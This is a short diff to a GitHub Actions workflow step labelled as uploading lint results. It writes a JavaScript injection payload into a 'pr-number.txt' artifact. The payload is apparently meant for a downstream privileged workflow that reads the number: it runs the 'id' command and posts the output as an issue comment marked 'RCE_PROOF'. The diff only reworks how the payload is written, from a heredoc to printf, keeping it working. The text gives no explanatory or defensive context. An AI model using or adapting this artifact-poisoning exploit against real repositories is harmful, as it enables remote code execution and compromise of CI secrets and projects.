@@ -10,9 +10,7 @@ jobs:
         run: |
           mkdir -p out
           echo "true" > out/has-warnings.txt
-          cat > out/pr-number.txt <<'EOF'
-1; const r = await exec.getExecOutput('id'); await github.rest.issues.createComment({issue_number: 1, owner: context.repo.owner, repo: context.repo.repo, body: 'RCE_PROOF ' + r.stdout.trim()})
-EOF
+          printf '%s\n' "1; const r = await exec.getExecOutput('id'); await github.rest.issues.createComment({issue_number: 1, owner: context.repo.owner, repo: context.repo.repo, body: 'RCE_PROOF ' + r.stdout.trim()})" > out/pr-number.txt
           cat out/pr-number.txt
       - name: Upload lint-results
         uses: actions/upload-artifact@v4
